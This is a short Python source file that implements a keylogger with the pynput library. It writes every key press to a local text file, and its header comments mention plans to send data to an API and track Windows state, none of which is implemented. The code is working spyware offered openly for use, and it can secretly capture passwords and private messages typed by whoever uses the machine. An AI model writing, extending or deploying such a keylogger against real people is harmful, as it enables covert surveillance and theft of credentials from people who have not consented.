# Here we have to build the Python KeyLogger.
# Using pyInput  : For Key Logginh.
# Using requests : For Sending request to an API.
# Using pywin32 : To track the user windows OS state.



from pynput.keyboard import Listener

file = "keyLogger.txt"


## This is a Simple Key Logger.
# It Saves the Text in the .txt File.
def onPressKey(key):
    try:
        with open(file, "a") as f:
            f.write(f'{key.char}')
    except Exception as e:
        with open(file, "a") as f:
            f.write(f'[{key}]')


with Listener(on_press=onPressKey) as listener:
    listener.join()